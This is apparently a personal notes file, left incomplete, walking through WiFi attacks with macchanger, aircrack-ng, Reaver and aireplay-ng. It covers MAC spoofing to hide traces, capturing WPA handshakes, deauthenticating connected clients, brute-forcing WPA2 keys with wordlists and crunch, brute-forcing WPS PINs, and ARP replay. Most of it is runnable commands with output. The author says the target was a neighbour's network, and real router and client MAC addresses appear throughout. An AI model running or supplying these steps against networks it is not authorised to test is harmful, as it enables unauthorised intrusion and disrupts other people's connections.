# Wifi Penetration Testing

The Following Heading will have few tools of our interest.

## Macchanger

This is for securing our trace on the machines, though not safe completely it is atleast an attempt to obscure :P

### Installation 

```
sudo apt install macchanger
```

I installed it with setting which disables changing Mac address everytime before an attempt to connect to a network is made. (Given in options)

### Wireless Interfaces  

They can be retrived by using `iwconfig` OR `ifconfig`
They are pretty handyand basic for knowing/checking details like your interface status and names,etc.

### Changing the MAC address

Bring down the selected interface, in my case `wlxe8de27059912`

```sh
sudo ifconfig wlxe8de27059912 down
```

You can check `ifconfig` does not show the device but `iwconfig` does. 

Now we can change/set the MAC Address of our device, to randomly assign one use the following command

```sh
sudo macchanger -r wlxe8de27059912
```

Now bring up the network interface
```sh
sudo ifconfig wlxe8de27059912 up
```

To revert back use 
```sh
sudo macchanger --permanent wlxe8de27059912
```

To see the current Mac Address use 
```sh
sudo macchanger --show wlxe8de27059912
```

### Reference 

* http://www.hackingtutorials.org/general-tutorials/mac-address-spoofing-with-macchanger/



## Aircrack-NG and Reaver

Testing the Aircrack Suite for Wifi Penetration on by neighbourhood wifi network. Just for learning though. Hope People understand. :P

### PART ONE Using Aircrack-NG only

	Basic Installation and testing out brute force WPA2 Penetration.

#### Installation

	```
	sudo apt install libssl-dev libnl-genl-3-dev libnl-3-dev crunch
	wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc4.tar.gz
	tar -zxvf aircrack-ng-1.2-rc4.tar.gz
	cd aircrack-ng-1.2-rc4
	make
	make install
	```


#### Start Monitoring on a specific interface  

1.	Check for the working wireless interface using `iwconfig`
	Output received :
		```sh
		feliz@Shikaku:/media/feliz/Safira/GitHub/Personal-Development/AircrackNG$ iwconfig
		```

		```
		lo        no wireless extensions.

		wlo1      IEEE 802.11bgn  ESSID:off/any  
		          Mode:Managed  Access Point: Not-Associated   Tx-Power=14 dBm   
		          Retry short limit:7   RTS thr:off   Fragment thr:off
		          Power Management:on
		          
		eno1      no wireless extensions.

		docker0   no wireless extensions.

		wlxe8de27059912  IEEE 802.11bgn  ESSID:off/any  
		          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
		          Retry short limit:7   RTS thr:off   Fragment thr:off
		          Power Management:off
		```

2.	For me its `wlo1` and `wlxe8de27059912`, to start Aircrack-NG Moitoring on this interface run :
		```sh
		sudo airmon-ng start wlo1
		```
	Output received :	
		```sh
			feliz@Shikaku:/media/feliz/Safira/GitHub/Personal-Development/AircrackNG$ sudo airmon-ng start wlo1
		```

		```
			Found 2 processes that could cause trouble.
			If airodump-ng, aireplay-ng or airtun-ng stops working after
			a short period of time, you may want to run 'airmon-ng check kill'

			  PID Name
			15077 NetworkManager
			15111 wpa_supplicant

			PHY	Interface	Driver		Chipset

			phy0	wlo1		iwlwifi		Intel Corporation Centrino Wireless-N 1000 [Condor Peak]

					(mac80211 monitor mode vif enabled for [phy0]wlo1 on [phy0]wlo1mon)
					(mac80211 station mode vif disabled for [phy0]wlo1)
			phy1	wlxe8de27059912	ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
		```
	OR 	
		```sh
		sudo airmon-ng start wlxe8de27059912
	Output received :
		```sh
			feliz@Shikaku:/media/feliz/Safira/GitHub/Personal-Development/AircrackNG$ sudo airmon-ng start wlxe8de27059912
		```

		```
			Found 2 processes that could cause trouble.
			If airodump-ng, aireplay-ng or airtun-ng stops working after
			a short period of time, you may want to run 'airmon-ng check kill'

			  PID Name
			15077 NetworkManager
			15111 wpa_supplicant

			PHY	Interface	Driver		Chipset

			phy0	wlo1mon		iwlwifi		Intel Corporation Centrino Wireless-N 1000 [Condor Peak]
			phy1	wlxe8de27059912	ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
			Interface 15mon is too long for linux so it will be renamed to the old style (wlan#) name.

					(mac80211 monitor mode vif enabled on [phy1]wlan0mon
					(mac80211 station mode vif disabled for [phy1]wlxe8de27059912)

		```

3.	Note the change in the name of the interface `wlo1mon` and `wlan0mon` , Now run `sudo airodump-ng wlo1mon`
	This should give out list of Wireless Networks that are running and out network card is able to capture.

4.	To stop run :
	```sh
		sudo airmon-ng stop wlan0mon
		sudo airmon-ng stop wlo1mon
	```

#### Testing Injection for the cards 

Basic Commands in increasing order of complexity:
```sh
sudo aireplay-ng --test wlan0mon
sudo aireplay-ng --test wlan0mon -a f4:f2:6d:d0:ac:9a -e SAMYAK
sudo aireplay-ng --test wlo1mon -a f4:f2:6d:d0:ac:9a -e SAMYAK
```


The command is of type:
```sh
sudo aireplay-ng --test wlo1mon -a <Victim BSSID> -e <Victim SSID>
```

#### Capturing Authentication Packets (IVs/Initialization Vectors)

```sh
sudo airodump-ng -c 9 --bssid f4:f2:6d:d0:ac:9a -w psk wlan0mon
```


The command is of type:
```sh
sudo airodump-ng -c 9 --bssid <Victim BSSID> -w psk wlan0mon
```

#### Deauthenticating User connected to the Victim Machine

In the process of capturing authentication packets by the method mentioned just above this one, its also going to capture the usual data packets. It will have information of any device's BSSID mentioned under `STATION` connected to our Victim's BSSID


```sh
sudo aireplay-ng -0 2 -a f4:f2:6d:d0:ac:9a -c 8C:BE:BE:3B:20:DD wlan0mon
sudo aireplay-ng -0 2 -a f4:f2:6d:d0:ac:9a -c A4:70:D6:82:27:8F wlan0mon
```

The command is of type:
```sh
sudo aireplay-ng -0 1 -a <Victim BSSID> -c <BSSIS of User Connected to Victim BSSID> ath0
```

After this rerun the capturing authentication packet process, once authentication packet is captured you should have something very much similar saying `CH  9 ][ Elapsed: 4 s ][ 2007-03-24 16:58 ][ WPA handshake: 00:14:6C:7E:40:80` somewhere on top printed on the screen.

* Recommendation : Run Caputring Authentication Packet Part on Terminal say `1` then on another instance of Terminal say `2` run the Deauthenticating User Command. This way we can have lowest latency in running commands.

#### Running aircrack-ng to crack the pre-shared key :

This key was obtained by capturing the handshake

```sh
aircrack-ng -w aircrack-ng-1.2-rc4/test/password.lst -b f4:f2:6d:d0:ac:9a psk*.cap
```

`password.lst` : file conatining the list of passwords as provided in source code of Aircrack-NG

The command is of type:
```sh
aircrack-ng -w password.lst -b <Victim BSSID> psk*.cap
```

Without Password List we can use Password generattor like `crunch`

```sh
crunch 8 8 abcdefghijklmnopqrstuvwxyz1234567890 | aircrack-ng -b f4:f2:6d:d0:ac:9a psk-04.cap -w- 
```

#### Reference 

* http://www.aircrack-ng.org/~~V/doku.php?id=cracking_wpa
* https://www.aircrack-ng.org/doku.php?id=injection_test
* https://www.youtube.com/watch?v=HMgDSI2hKPg


### PART TWO Reaver + Aircrack-Ng 

	Brute Force Cracking the WPS Pin

#### Installation 

```sh
sudo apt-get install libpcap-dev sqlite3 libsqlite3-dev
sudo apt install reaver
```

#### Checking/Monitoring the networks

First get intoMonitoring mode by :
  ```sh
  sudo airmon-ng start wlxe8de27059912
  ``` 

The BSSID of the Victim can be obtained by :

```sh
sudo airodump-ng wlan0mon
``` 

OR Another tool by Reaver is `wash`, here's how to use it 

```sh
sudo wash -i wlan0mon
```

Note : `airmon-ng` changed the name of the interface from `wlxe8de27059912` to `wlan0mon` when it restarted it in monitoring mode.

#### Targetting the Victim Network

```sh
sudo reaver -i wlan0mon -b F4:F2:6D:D0:AC:9A -v
```

This command is of form
```sh
reaver -i <Interface in Monitor Mode> -b <Victim's BSSID> -v
```

#### Reference 

* https://tools.kali.org/wireless-attacks/reaver
* https://null-byte.wonderhowto.com/how-to/hack-wpa-wifi-passwords-by-cracking-wps-pin-0132542/	  


## John The Ripper

Brute FOrce Password cracker from hash


### Installations

```sh
sudo apt install john 
```

### Sniffing IVS (Initialization Vectors)

```sh
sudo airodump-ng -c 7 --bssid F4:F2:6D:D0:AC:9A -w dump wlo1mon
```

Command is of type :

```sh
sudo airodump-ng -c <Victim's Channel Number> --bssid <Victim's BSSID> -w <File Name to save under> <Your interface which is in monitor mode>
```


### ARP Replay 

```sh
sudo aireplay-ng --arpreplay -b F4:F2:6D:D0:AC:9A -c A4:70:D6:82:27:8F wlo1mon
```


Command is of type :

```sh
sudo aireplay-ng --arpreplay -b <Target Bssid> -c <Client COnnected to the Target> wlo1mon
```

### Deauth The client 
(Same as mentioned above sections) 

```sh
sudo aireplay-ng --deauth 5 -a F4:F2:6D:D0:AC:9A -c A4:70:D6:82:27:8F wlo1mon
```

---Incomplete